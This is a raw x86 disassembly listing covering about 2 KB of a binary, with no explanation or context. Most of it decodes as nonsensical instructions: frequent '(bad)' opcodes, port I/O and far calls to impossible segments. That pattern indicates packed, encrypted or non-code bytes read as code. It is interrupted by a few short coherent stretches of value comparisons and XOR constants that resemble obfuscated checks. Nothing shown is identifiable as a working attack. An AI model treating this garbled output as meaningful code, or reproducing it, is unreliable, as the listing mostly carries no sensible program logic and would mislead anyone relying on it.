  41aa06:	sbb    dh,BYTE PTR [esi]
  41aa08:	(bad)  
  41aa09:	ret    
  41aa0a:	mov    bl,0xe0
  41aa0c:	or     esp,DWORD PTR [esi-0x42]
  41aa0f:	or     BYTE PTR [edi-0xb43690d],ch
  41aa15:	(bad)  
  41aa16:	sti    
  41aa17:	ins    DWORD PTR es:[edi],dx
  41aa18:	outs   dx,DWORD PTR ds:[esi]
  41aa19:	add    eax,0xb2fe6b09
  41aa1e:	ficomp DWORD PTR [ecx+0x6b1e87a5]
  41aa24:	in     eax,dx
  41aa25:	adc    al,0xfc
  41aa27:	push   ecx
  41aa28:	repnz leave 
  41aa2a:	cdq    
  41aa2b:	scas   al,BYTE PTR es:[edi]
  41aa2c:	test   al,0x7
  41aa2e:	pop    esp
  41aa2f:	aam    0x15
  41aa31:	pop    ds
  41aa32:	push   0xd416a8ed
  41aa37:	add    eax,0x14d1ff5b
  41aa3c:	retf   
  41aa3d:	jns    0x41aa65
  41aa3f:	mov    cl,0x40
  41aa41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa42:	test   eax,0x873840d8
  41aa47:	mov    ch,0x2f
  41aa49:	push   ecx
  41aa4a:	retf   
  41aa4b:	jbe    0x41aa1f
  41aa4d:	daa    
  41aa4e:	xchg   esi,eax
  41aa4f:	rcl    DWORD PTR [eax+eiz*4+0x5b],1
  41aa53:	ins    DWORD PTR es:[edi],dx
  41aa54:	ja     0x41aa92
  41aa56:	mov    ebp,0x8efc585a
  41aa5b:	pop    ds
  41aa5c:	jae    0x41aa8c
  41aa5e:	xchg   esi,eax
  41aa5f:	(bad)  
  41aa60:	(bad)  
  41aa61:	adc    eax,0x1b196d34
  41aa66:	std    
  41aa67:	pop    es
  41aa68:	mov    ebx,0xe042d665
  41aa6d:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41aa6f:	xchg   ebx,eax
  41aa70:	dec    edx
  41aa71:	adc    al,0xe2
  41aa73:	push   eax
  41aa74:	fsubp  st(2),st
  41aa76:	repnz push ds
  41aa78:	fadd   QWORD PTR [ecx]
  41aa7a:	call   0x144:0x631c2b1b
  41aa81:	je     0x41aa70
  41aa83:	mov    eax,ds:0xfa1aa708
  41aa88:	ins    BYTE PTR es:[edi],dx
  41aa89:	mov    ds:0x42c316ca,al
  41aa8e:	ins    BYTE PTR es:[edi],dx
  41aa8f:	add    ebp,ecx
  41aa91:	mov    ah,0x63
  41aa93:	push   esp
  41aa94:	cmp    al,0x29
  41aa96:	clc    
  41aa97:	push   ss
  41aa98:	mov    ah,0xc5
  41aa9a:	mov    ebx,0xb71f6def
  41aa9f:	sbb    ah,ah
  41aaa1:	push   cs
  41aaa2:	fisub  WORD PTR [ebx+ebx*1+0x62]
  41aaa6:	repz cmp edx,DWORD PTR [ebx]
  41aaa9:	mov    ?,esp
  41aaab:	cs aas 
  41aaad:	and    eax,0x5f42c63a
  41aab2:	aad    0xe9
  41aab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aab5:	int    0x72
  41aab7:	cdq    
  41aab8:	xor    edi,DWORD PTR [ebx-0x77]
  41aabb:	(bad)  
  41aabc:	int3   
  41aabd:	push   0x26
  41aabf:	and    ebp,DWORD PTR [eax+0x73]
  41aac2:	or     al,0xaa
  41aac4:	push   ebx
  41aac5:	jp     0x41ab30
  41aac7:	xchg   BYTE PTR [ebx-0x29],al
  41aaca:	add    eax,0x85101868
  41aacf:	out    0x3,al
  41aad1:	add    al,0xe0
  41aad3:	sti    
  41aad4:	cmp    BYTE PTR [ecx],cl
  41aad6:	(bad)  
  41aad7:	repz daa 
  41aad9:	jo     0x41aae4
  41aadb:	dec    ebx
  41aadc:	push   es
  41aadd:	lock mov ch,BYTE PTR [ecx]
  41aae0:	nop
  41aae1:	push   ecx
  41aae2:	cs clc 
  41aae4:	sbb    BYTE PTR [edi+0x8],cl
  41aae7:	js     0x41aae3
  41aae9:	into   
  41aaea:	outs   dx,DWORD PTR ds:[esi]
  41aaeb:	div    BYTE PTR [ebp+0x9]
  41aaee:	in     eax,dx
  41aaef:	cmove  edi,DWORD PTR [ecx-0x80]
  41aaf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaf4:	jae    0x41aad0
  41aaf6:	jg     0x41ab40
  41aaf8:	jg     0x41aaa0
  41aafa:	push   cs
  41aafb:	adc    BYTE PTR [edx],dh
  41aafd:	inc    esp
  41aafe:	sub    ch,BYTE PTR [edi]
  41ab00:	mov    esi,0x7ef86bd3
  41ab05:	push   ds
  41ab06:	mov    ebx,DWORD PTR [esp+0x34]
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x42202e
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x42202e
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax-0x41d4399d],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1-0x5c67e7e8],bh
  41ab67:	push   0xaa1fd1f6
  41ab6c:	push   es
  41ab6d:	dec    ebp
  41ab6e:	and    edi,DWORD PTR [eax+0x72]
  41ab71:	fwait
  41ab72:	xor    al,0xbc
  41ab74:	clc    
  41ab75:	mov    esi,0xdcefa1b8
  41ab7a:	js     0x41ab21
  41ab7c:	test   al,0x82
  41ab7e:	addr16 (bad) 
  41ab80:	in     al,dx
  41ab81:	push   ebp
  41ab82:	mov    esi,0xfe32e9db
  41ab87:	add    ecx,DWORD PTR [ebx-0x5f75848e]
  41ab8d:	scas   al,BYTE PTR es:[edi]
  41ab8e:	or     bl,BYTE PTR [edx]
  41ab90:	sbb    BYTE PTR [ecx+0x1a03e1c3],dl
  41ab96:	adc    edi,ebp
  41ab98:	jae    0x41abb3
  41ab9a:	mov    cl,0x75
  41ab9c:	int    0x87
  41ab9e:	dec    ebp
  41ab9f:	adc    DWORD PTR [eax+0x75ea5383],ebx
  41aba5:	and    bl,BYTE PTR [esi-0x237d0c92]
  41abab:	adc    BYTE PTR [ecx*2-0x74e0314b],ah
  41abb2:	je     0x41abe6
  41abb4:	ins    DWORD PTR es:[edi],dx
  41abb5:	inc    ebp
  41abb6:	jns    0x41ac06
  41abb8:	ins    DWORD PTR es:[edi],dx
  41abb9:	retf   0x3395
  41abbc:	xchg   esi,eax
  41abbd:	aas    
  41abbe:	and    cl,BYTE PTR [ecx]
  41abc0:	sahf   
  41abc1:	mov    bh,0xc1
  41abc3:	dec    ecx
  41abc4:	inc    edx
  41abc5:	dec    edi
  41abc6:	add    BYTE PTR [edi],bh
  41abc8:	into   
  41abc9:	xor    eax,0xad6689b7
  41abce:	pop    ebp
  41abcf:	mov    cl,0x10
  41abd1:	xchg   esi,eax
  41abd2:	mov    edx,0x14a4838
  41abd7:	adc    dl,bh
  41abd9:	ins    DWORD PTR es:[edi],dx
  41abda:	imul   esp,edi,0xffffffb3
  41abdd:	pop    esi
  41abde:	xchg   bh,al
  41abe0:	push   cs
  41abe1:	popa   
  41abe2:	out    0x7e,eax
  41abe4:	pop    ebx
  41abe5:	push   0xb6a20b87
  41abea:	inc    ebx
  41abeb:	push   esp
  41abec:	pusha  
  41abed:	or     al,0x90
  41abef:	outs   dx,BYTE PTR ds:[esi]
  41abf0:	lahf   
  41abf1:	rcr    eax,0x35
  41abf4:	stos   BYTE PTR es:[edi],al
  41abf5:	push   eax
  41abf6:	imul   eax,esi,0x31f1e23e
  41abfc:	lock cld 
  41abfe:	scas   eax,DWORD PTR es:[edi]
  41abff:	cmp    al,0x97
  41ac01:	dec    eax
  41ac02:	sbb    BYTE PTR [ebp-0x56500ab6],ah
  41ac08:	add    esi,DWORD PTR [esi+0x57e7c0d1]
  41ac0e:	push   ebx
  41ac0f:	sub    al,0xe6
  41ac11:	test   BYTE PTR [ebp+0x64],bh
  41ac14:	jb     0x41ac7e
  41ac16:	and    al,0x9e
  41ac18:	aas    
  41ac19:	inc    ecx
  41ac1a:	ret    
  41ac1b:	test   BYTE PTR [ecx],bl
  41ac1d:	sbb    ecx,DWORD PTR [eax]
  41ac1f:	(bad)  
  41ac20:	repz inc esi
  41ac22:	out    0xa6,al
  41ac24:	in     eax,0xbc
  41ac26:	(bad)  
  41ac27:	cmc    
  41ac28:	jp     0x41ac9f
  41ac2a:	adc    edi,ebp
  41ac2c:	push   eax
  41ac2d:	jmp    0x41ac5d
  41ac2f:	mov    ecx,0x9fd7c3fb
  41ac34:	pushf  
  41ac35:	mov    ?,WORD PTR [esi-0xa]
  41ac38:	clc    
  41ac39:	sub    DWORD PTR [ebx+0x522a2545],edx
  41ac3f:	push   es
  41ac40:	rcr    BYTE PTR [ebx+0x65d79405],1
  41ac46:	loopne 0x41ac80
  41ac48:	mov    ch,0xba
  41ac4a:	mov    edi,0x6d2c207b
  41ac4f:	gs call 0x307e:0x6db2a9a5
  41ac57:	cdq    
  41ac58:	or     ecx,ebx
  41ac5a:	dec    ebx
  41ac5b:	hlt    
  41ac5c:	jae    0x41abf1
  41ac5e:	xchg   dl,dh
  41ac60:	dec    ecx
  41ac61:	jl     0x41ac9c
  41ac63:	and    al,0xe8
  41ac65:	dec    ecx
  41ac66:	mov    ebp,DWORD PTR [ebp+0x3]
  41ac69:	sub    eax,0x484caaab
  41ac6e:	or     al,BYTE PTR [edx]
  41ac70:	xchg   ebp,eax
  41ac71:	mov    ah,0x5b
  41ac73:	adc    BYTE PTR [eax],dh
  41ac75:	jnp    0x41acda
  41ac77:	ret    
  41ac78:	gs popa 
  41ac7a:	bound  ebx,QWORD PTR [ecx]
  41ac7c:	adc    eax,0x3cdeb0f9
  41ac81:	call   0x661c98d9
  41ac86:	inc    ecx
  41ac87:	mov    dh,0x84
  41ac89:	push   ss
  41ac8a:	pop    esi
  41ac8b:	iret   
  41ac8c:	loope  0x41aca3
  41ac8e:	into   
  41ac8f:	test   eax,eax
  41ac91:	dec    edx
  41ac92:	add    dh,BYTE PTR [edi]
  41ac94:	jge    0x41acf6
  41ac96:	adc    al,0x7a
  41ac98:	jge    0x41acde
  41ac9a:	xchg   ecx,eax
  41ac9b:	popf   
  41ac9c:	in     eax,0xf6
  41ac9e:	int3   
  41ac9f:	inc    ecx
  41aca0:	pop    es
  41aca1:	dec    ebp
  41aca2:	mov    ch,0xa0
  41aca4:	stos   DWORD PTR es:[edi],eax
  41aca5:	cmc    
  41aca6:	mov    bl,0x9a
  41aca8:	pop    esp
  41aca9:	fstp   TBYTE PTR [edi+0x78ef00c6]
  41acaf:	jns    0x41acae
  41acb1:	test   DWORD PTR [ebp-0x1a377bcf],eax
  41acb7:	addr16 sub dl,al
  41acba:	cmp    al,0x79
  41acbc:	cmp    eax,0xd704791e
  41acc1:	retf   0x831c
  41acc4:	xchg   edx,eax
  41acc5:	jb     0x41ad46
  41acc7:	stc    
  41acc8:	xchg   esp,eax
  41acc9:	enter  0x3806,0x0
  41accd:	jle    0x41ad4c
  41accf:	push   es
  41acd0:	ss push esi
  41acd2:	scas   eax,DWORD PTR es:[edi]
  41acd3:	out    dx,al
  41acd4:	sub    eax,0x299ecb88
  41acd9:	aas    
  41acda:	(bad)  
  41acdb:	xor    dl,bh
  41acdd:	push   ebp
  41acde:	cdq    
  41acdf:	cli    
  41ace0:	inc    edx
  41ace1:	aam    0x36
  41ace3:	retf   0xe22c
  41ace6:	sbb    eax,0x772594c7
  41aceb:	out    0xe8,eax
  41aced:	mov    ds,WORD PTR [esi-0x5b]
  41acf0:	je     0x41acc0
  41acf2:	test   DWORD PTR [esi+0x3f61aa83],0x3037b6b2
  41acfc:	xor    bh,dl
  41acfe:	xor    cl,bl
  41ad00:	retf   0x1463
  41ad03:	sub    bh,BYTE PTR [eax+ebx*8+0x2d1476c2]
  41ad0a:	ins    BYTE PTR es:[edi],dx
  41ad0b:	sti    
  41ad0c:	sub    edi,ebx
  41ad0e:	mov    ebx,0xdf79abb6
  41ad13:	cmc    
  41ad14:	popf   
  41ad15:	xchg   BYTE PTR [esi+0xf1e9ceb],ah
  41ad1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad1c:	xlat   BYTE PTR ds:[ebx]
  41ad1d:	mov    al,ds:0x64478665
  41ad22:	pmaddwd mm0,QWORD PTR [esi]
  41ad25:	push   0x8c0ac6e1
  41ad2a:	push   esp
  41ad2b:	xor    BYTE PTR [edi-0x73],0x63
  41ad2f:	outs   dx,BYTE PTR ds:[esi]
  41ad30:	pop    es
  41ad31:	cmp    dl,BYTE PTR [esi]
  41ad33:	cli    
  41ad34:	sub    BYTE PTR [edi+ecx*8+0x45],0x38
  41ad39:	mov    bh,0xda
  41ad3b:	pushf  
  41ad3c:	icebp  
  41ad3d:	push   cs
  41ad3e:	mov    ah,0x7a
  41ad40:	sahf   
  41ad41:	add    DWORD PTR [ebx+edx*2],ebp
  41ad44:	sbb    BYTE PTR [esp+edx*2+0x7fa414bc],bl
  41ad4b:	mov    al,ds:0x5536c577
  41ad50:	leave  
  41ad51:	sub    cl,BYTE PTR [eax+0x27]
  41ad54:	cli    
  41ad55:	xchg   ebx,eax
  41ad56:	div    esi
  41ad58:	sbb    BYTE PTR [ebp-0xe58e91d],bh
  41ad5e:	cmp    BYTE PTR [ebx-0x1cfef706],ah
  41ad64:	lahf   
  41ad65:	sbb    DWORD PTR [eax-0x2e135b6],edx
  41ad6b:	lahf   
  41ad6c:	dec    ebx
  41ad6d:	mov    eax,0x9aecfa71
  41ad72:	repz mov edx,0x99bcb8a5
  41ad78:	jle    0x41ad67
  41ad7a:	lea    esi,[esi]
  41ad7c:	loop   0x41ad2d
  41ad7e:	in     al,0xe6
  41ad80:	shr    ah,cl
  41ad82:	(bad)  
  41ad83:	repnz repnz inc eax
  41ad86:	outs   dx,BYTE PTR ds:[esi]
  41ad87:	ret    0xcfc1
  41ad8a:	cmp    BYTE PTR [edx],0x3d
  41ad8d:	fnsave [ebx-0x495d9fd]
  41ad93:	addr16 sbb al,0x8d
  41ad96:	in     eax,0x4a
  41ad98:	data16 hlt 
  41ad9a:	sti    
  41ad9b:	cmp    esp,0xfda0be2e
  41ada1:	cmp    DWORD PTR [ebx+0x25],esi
  41ada4:	xchg   DWORD PTR [ecx-0x19],esi
  41ada7:	and    BYTE PTR [esi-0x35],0x39
  41adab:	sub    al,0xc0
  41adad:	xor    DWORD PTR [edi-0x61],esi
  41adb0:	add    al,0x15
  41adb2:	in     al,0x5c
  41adb4:	jg     0x41adbb
  41adb6:	pop    ds
  41adb7:	mov    DWORD PTR [edx],edx
  41adb9:	jge    0x41ad99
  41adbb:	lock dec esi
  41adbd:	inc    ebx
  41adbe:	xchg   DWORD PTR [ecx+0x4ddb76b8],esi
  41adc4:	xor    DWORD PTR [esi],0x35d04b5d
  41adca:	je     0x41ae3d
  41adcc:	cmp    eax,0xb35403ee
  41add1:	clc    
  41add2:	mov    bl,0x65
  41add4:	enter  0xf64a,0x12
  41add8:	fs jne 0x41ad76
  41addb:	outs   dx,DWORD PTR ds:[esi]
  41addc:	sub    ebx,DWORD PTR [ecx+0x4f]
  41addf:	outs   dx,DWORD PTR ds:[esi]
  41ade0:	jb     0x41ad93
  41ade2:	jmp    0x30c7:0x43317b5
  41ade9:	cwde   
  41adea:	mov    ds:0x26978286,eax
  41adef:	data16 mov bl,0x10
  41adf2:	xor    eax,0x76c9eade
  41adf7:	sub    esi,DWORD PTR [ecx+ebp*4-0x3e31f857]
  41adfe:	push   edx
  41adff:	inc    ebp
  41ae00:	dec    esi
  41ae01:	adc    DWORD PTR [ecx+0x32],ebp
  41ae04:	mov    ds:0x712ff7ce,eax
  41ae09:	cmp    DWORD PTR [edi+edx*2],edi
  41ae0c:	add    esp,esi
  41ae0e:	jl     0x41adc0
  41ae10:	retf   
  41ae11:	sbb    al,0x20
  41ae13:	mov    ah,0x5
  41ae15:	pop    edi
  41ae16:	in     eax,0xf9
  41ae18:	mov    edx,0x16a4b4d
  41ae1d:	repz xor DWORD PTR [ecx+0x41],edx
  41ae21:	or     cl,al
  41ae23:	cmp    DWORD PTR [ebx],eax
  41ae25:	sti    
  41ae26:	pop    es
  41ae27:	cmp    dh,BYTE PTR fs:[edx-0x1e]
  41ae2b:	cmp    BYTE PTR [edx],dh
  41ae2d:	in     al,0x89
  41ae2f:	retf   0xfd0d
  41ae32:	jmp    0x328f2bdb
  41ae37:	arpl   WORD PTR [eax-0x12],di
  41ae3a:	cmp    eax,0xa759de0c
  41ae3f:	xor    ecx,DWORD PTR [ebp+0x42120231]
  41ae45:	xchg   esp,eax
  41ae46:	xchg   ebp,eax
  41ae47:	cmc    
  41ae48:	pop    esi
  41ae49:	aaa    
  41ae4a:	push   esi
  41ae4b:	mov    ds:0x29c9eb5e,eax
  41ae50:	jns    0x41ae2b
  41ae52:	pop    edx
  41ae53:	fimul  WORD PTR [eax+0x4742fcb9]
  41ae59:	stos   BYTE PTR es:[edi],al
  41ae5a:	jle    0x41ae07
  41ae5c:	mov    eax,0x19c9d1a6
  41ae61:	popf   
  41ae62:	mov    bl,0xe5
  41ae64:	adc    al,0x7e
  41ae66:	mov    ah,BYTE PTR [ebp-0x7]
  41ae69:	xor    eax,DWORD PTR [eax+0x56b2d0a6]
  41ae6f:	(bad)  
  41ae70:	fidiv  WORD PTR [edx-0x2f2c8f57]
  41ae76:	ret    0x6731
  41ae79:	sahf   
  41ae7a:	leave  
  41ae7b:	lods   eax,DWORD PTR ds:[esi]
  41ae7c:	loop   0x41ae06
  41ae7e:	mov    al,ds:0xd568838f
  41ae83:	inc    ebp
  41ae84:	jecxz  0x41aeda
  41ae86:	nop
  41ae87:	sbb    eax,0x20f17cff
  41ae8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae8d:	call   0x4484:0x639b3167
  41ae94:	out    dx,al
  41ae95:	add    al,0x22
  41ae97:	sbb    eax,0x1f78889d
  41ae9c:	cmp    eax,0xeb8537f1
  41aea1:	or     BYTE PTR [edx+0x6276de66],bl
  41aea7:	cli    
  41aea8:	bound  ebx,QWORD PTR ds:0xe98b390a
  41aeae:	add    eax,0xb2f28728
  41aeb3:	dec    ebp
  41aeb4:	inc    BYTE PTR [ebp-0x73]
  41aeb7:	pushf  
  41aeb8:	jge    0x41ae99
  41aeba:	jmp    0x97ba:0x4500b1ac
  41aec1:	mov    eax,ds:0xbab73981
  41aec6:	sar    ebx,cl
  41aec8:	cdq    
  41aec9:	sub    al,0x3a
  41aecb:	inc    eax
  41aecc:	push   edx
  41aecd:	inc    esp
  41aece:	pop    eax
  41aecf:	xchg   esp,eax
  41aed0:	add    eax,0x2d2ff62b
  41aed5:	ja     0x41af17
  41aed7:	inc    esi
  41aed8:	mov    BYTE PTR [edx-0x36],bl
  41aedb:	fucom  st(5)
  41aedd:	push   0xa9d4a735
  41aee2:	and    eax,0xd82483d5
  41aee7:	cmp    bl,BYTE PTR [edi]
  41aee9:	sahf   
  41aeea:	push   esp
  41aeeb:	sbb    eax,esi
  41aeed:	in     al,0xf1
  41aeef:	shr    BYTE PTR ss:0x38cfc403,0xa2
  41aef7:	sub    eax,0x4adf1a27
  41aefc:	pop    ecx
  41aefd:	mov    ds:0x756c230f,al
  41af02:	push   cs
  41af03:	leave  
  41af04:	jne    0x41aef0
  41af06:	sbb    eax,ecx
  41af08:	sub    ecx,DWORD PTR [edi+0x247929b3]
  41af0e:	cmp    DWORD PTR [ebx+ebp*2],esp
  41af11:	sbb    edx,DWORD PTR [edi+0xa7a729c]
  41af17:	je     0x41d921
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41af57
  41af80:	jl     0x41afcb
  41af82:	push   0x17
  41af84:	xchg   edi,eax
  41af85:	push   ss
  41af86:	sbb    BYTE PTR [edx+edx*1-0x3338e7e8],bh
  41af8d:	into   
  41af8e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41af90:	sbb    ebx,DWORD PTR [edi-0x19]
  41af93:	pop    esp
  41af94:	call   0x73a7a500
  41af99:	ins    BYTE PTR es:[edi],dx
  41af9a:	pop    esp
  41af9b:	xor    eax,0x6024d71c
  41afa0:	dec    edx
  41afa1:	mov    ds:0xdc1e1138,eax
  41afa6:	sti    
  41afa7:	jl     0x41afd4
  41afa9:	shl    BYTE PTR [ebx+0x3cef6921],0xd1
  41afb0:	ror    BYTE PTR [eax+0x65],1
  41afb3:	xchg   edi,eax
  41afb4:	pop    esp
  41afb5:	rcl    bh,cl
  41afb7:	add    ch,dl
  41afb9:	rcr    BYTE PTR [eax+0x12],cl
  41afbc:	pop    edi
  41afbd:	jmp    0x52039e5c
  41afc2:	cwde   
  41afc3:	into   
  41afc4:	push   edx
  41afc5:	adc    cl,bl
  41afc7:	pushf  
  41afc8:	lock jle 0x41b037
  41afcb:	xor    DWORD PTR [esi],0xffffffaf
  41afce:	int    0x2b
  41afd0:	nop
  41afd1:	sub    dl,ah
  41afd3:	retf   0xfafc
  41afd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afd7:	cmp    cl,BYTE PTR [esp+edi*2-0x2b]
  41afdb:	sbb    BYTE PTR [esi+0x7596aad],dh
  41afe1:	cmc    
  41afe2:	jne    0x41afbe
  41afe4:	int    0x69
  41afe6:	clc    
  41afe7:	dec    esi
  41afe8:	stc    
  41afe9:	inc    edx
  41afea:	scas   eax,DWORD PTR es:[edi]
  41afeb:	cmp    bh,al
  41afed:	ret    
  41afee:	mov    BYTE PTR ds:0xad9ced85,dh
  41aff4:	bound  eax,QWORD PTR [ebp-0x2641a42b]
  41affa:	stos   DWORD PTR es:[edi],eax
  41affb:	dec    ebx
  41affc:	es imul edx,esi,0x3
  41b000:	shl    eax,cl
  41b002:	push   ebx
  41b003:	cmc    
  41b004:	xor    al,0x4e
  41b006:	rcr    BYTE PTR [esi-0x7a29b59a],cl
  41b00c:	or     BYTE PTR [ebx-0x32],dl
  41b00f:	and    BYTE PTR [eax+0x4c],bh
  41b012:	or     DWORD PTR [eax+0x24405c07],ebp
  41b018:	dec    ebx
  41b019:	inc    ebp
  41b01a:	aaa    
  41b01b:	dec    eax
  41b01c:	sub    DWORD PTR [esi+0x33],0x7e
  41b020:	sahf   
  41b021:	nop
  41b022:	xor    bl,bl
  41b024:	add    al,0x84
  41b026:	sub    eax,0x39ce55ad
  41b02b:	dec    ebp
  41b02c:	data16 lods al,BYTE PTR ds:[esi]
  41b02e:	fisubr WORD PTR [edx]
  41b030:	xlat   BYTE PTR ds:[ebx]
  41b031:	loop   0x41b03d
  41b033:	pop    edx
  41b034:	jmp    0x7cbfef4c
  41b039:	sub    eax,0x61ee36fc
  41b03e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41b040:	mov    ss,WORD PTR [eax+eiz*2+0x12]
  41b044:	(bad)  
  41b045:	mov    al,ds:0x8348dbc0
  41b04a:	mov    bl,0x69
  41b04c:	xchg   esp,eax
  41b04d:	add    bl,bl
  41b04f:	add    BYTE PTR [eax-0x5441b29a],bh
  41b055:	mov    ah,0xbd
  41b057:	pop    esp
  41b058:	shl    DWORD PTR [eax-0x464fa7b1],cl
  41b05e:	pop    edi
  41b05f:	mov    bl,0x21
  41b061:	adc    al,0x48
  41b063:	(bad)  
  41b064:	in     eax,0xa2
  41b066:	push   esp
  41b067:	push   ecx
  41b068:	mov    edx,0x4d1bfc6d
  41b06d:	stos   DWORD PTR es:[edi],eax
  41b06e:	(bad)  
  41b06f:	fidiv  DWORD PTR [edi]
  41b071:	dec    edi
  41b072:	mov    eax,0x84fd9a1a
  41b077:	jge    0x41b023
  41b079:	dec    esi
  41b07a:	inc    esi
  41b07b:	gs cld 
  41b07d:	jl     0x41b0fc
  41b07f:	scas   eax,DWORD PTR es:[edi]
  41b080:	inc    esi
  41b081:	shr    DWORD PTR [ecx-0x76],0x8d
  41b085:	cmp    al,0x88
  41b087:	dec    edx
  41b088:	imul   esi,DWORD PTR [ebp-0x1cd9545c],0xb912685d
  41b092:	jb     0x41b0ab
  41b094:	and    eax,0xe91b412e
  41b099:	arpl   WORD PTR [edi+esi*8],si
  41b09c:	jnp    0x41b0cb
  41b09e:	(bad)
  41b0a1:	out    dx,eax
  41b0a2:	xlat   BYTE PTR ds:[ebx]
  41b0a3:	pop    edi
  41b0a4:	and    esi,edx
  41b0a6:	out    0x97,al
  41b0a8:	add    al,0xa4
  41b0aa:	icebp  
  41b0ab:	and    al,0x32
  41b0ad:	lock dec ebx
  41b0af:	and    ebx,DWORD PTR [esp+ebp*2-0x55]
  41b0b3:	lahf   
  41b0b4:	ret    
  41b0b5:	imul   edi,DWORD PTR [edi],0x148fe636
  41b0bb:	hlt    
  41b0bc:	mov    ebp,0xcf1ea2a
  41b0c1:	ja     0x41b0ac
  41b0c3:	not    bh
  41b0c5:	and    eax,0xf06b914e
  41b0ca:	xchg   esp,eax
  41b0cb:	sub    dh,cl
  41b0cd:	arpl   WORD PTR [ebp-0x3a],ax
  41b0d0:	mov    al,cl
  41b0d2:	mov    edx,edx
  41b0d4:	jo     0x41b100
  41b0d6:	inc    ebx
  41b0d7:	pop    ecx
  41b0d8:	adc    al,0x3e
  41b0da:	ficom  WORD PTR [edx-0x40]
  41b0dd:	aas    
  41b0de:	je     0x41b0f3
  41b0e0:	iret   
  41b0e1:	outs   dx,DWORD PTR ds:[esi]
  41b0e2:	aam    0xf2
  41b0e4:	mov    eax,0xba0ded24
  41b0e9:	dec    ecx
  41b0ea:	dec    eax
  41b0eb:	adc    BYTE PTR [edi+0x4f],dl
  41b0ee:	fmul   QWORD PTR [edx+0x4daea0d0]
  41b0f4:	fnstenv [edx]
  41b0f6:	daa    
  41b0f7:	mov    ebx,0xbed6bb8d
  41b0fc:	cli    
  41b0fd:	adc    eax,0x332717f3
  41b102:	loope  0x41b148
  41b104:	mov    BYTE PTR [edx],bl
  41b106:	lock sub eax,0xbc1f4ee0
  41b10c:	inc    ecx
  41b10d:	mov    WORD PTR [esi-0x43a462c0],gs
  41b113:	inc    edx
  41b114:	xchg   esp,eax
  41b115:	pop    edi
  41b116:	leave  
  41b117:	in     al,dx
  41b118:	xor    WORD PTR [esi+0x73],cx
  41b11c:	jp     0x41b136
  41b11e:	(bad)  
  41b11f:	mov    bl,0x13
  41b121:	stos   DWORD PTR es:[di],eax
  41b123:	icebp  
  41b124:	mov    eax,0x4ba79be2
  41b129:	mov    esi,0xa3f1ce25
  41b12e:	push   ebx
  41b12f:	pusha  
  41b130:	inc    ecx
  41b131:	lods   al,BYTE PTR ds:[esi]
  41b132:	rcr    DWORD PTR ss:[eax+ebp*2],cl
  41b136:	loop   0x41b18c
  41b138:	pop    eax
  41b139:	pushf  
  41b13a:	repz sbb dl,ch
  41b13d:	mov    dl,0x2c
  41b13f:	dec    ebx
  41b140:	icebp  
  41b141:	push   0x53d169b6
  41b146:	jmp    0xe6a1cf46
  41b14b:	cmp    DWORD PTR [edx],0xcf94c854
  41b151:	mov    esi,0x9248228f
  41b156:	push   edx
  41b157:	out    0x2,eax
  41b159:	push   esi
  41b15a:	loopne 0x41b0f4
  41b15c:	xlat   BYTE PTR ds:[ebx]
  41b15d:	and    eax,0x7b40df47
  41b162:	mov    eax,ds:0x55486605
  41b167:	inc    edx
  41b168:	dec    esi
  41b169:	int3   
  41b16a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b16b:	lea    esp,[edi+0x19]
  41b16e:	daa    
  41b16f:	test   al,0xe1
  41b171:	leave  
  41b172:	xchg   ecx,eax
  41b173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b174:	int3   
  41b175:	cli    
  41b176:	add    DWORD PTR [ecx],eax
  41b178:	add    esp,DWORD PTR ds:0x8b21177
